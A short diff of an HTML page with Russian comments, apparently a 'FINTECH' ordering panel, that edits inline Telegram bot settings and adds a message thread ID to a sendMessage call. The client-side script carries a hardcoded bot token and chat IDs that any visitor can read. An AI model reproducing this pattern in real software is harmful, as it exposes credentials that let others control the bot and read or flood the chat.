@@ -17,11 +17,12 @@
 
   <!-- Конфигурация Telegram API (Вставь свои данные) -->
   <script>
-    const BOT_TOKEN = "8741449800:AAHTyC8VY1wOyIgZQRlldbGg22ze4Gvu18g";
-    const ADMIN_ID = "1850885518";         // Твой личный Telegram ID
-    const GROUP_CHAT_ID = "-1004462228867";  // ID группы команды
-    const ADMIN_USERNAME = "mal0one";   // Для ручной выдачи ссылок РКО и ИП
-  </script>
+  const BOT_TOKEN = "8741449800:AAHTyC8VY1wOyIgZQRll1dbGg22ze4Gvu18g";
+  const ADMIN_ID = "1850885518";
+  const GROUP_CHAT_ID = "-1004462228867";
+  const ADMIN_USERNAME = "mal0one";
+  const THREAD_ID = 5; //
+</script>
 
   <!-- Шапка окна FINTECH -->
   <div class="flex justify-between items-center mb-4">
@@ -329,7 +330,12 @@
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: GROUP_CHAT_ID, text: text, parse_mode: 'HTML' })
+        body: JSON.stringify({ 
+          chat_id: GROUP_CHAT_ID, 
+          message_thread_id: THREAD_ID, // 
+          text: text, 
+          parse_mode: 'HTML' 
+        })
       });
     }
 
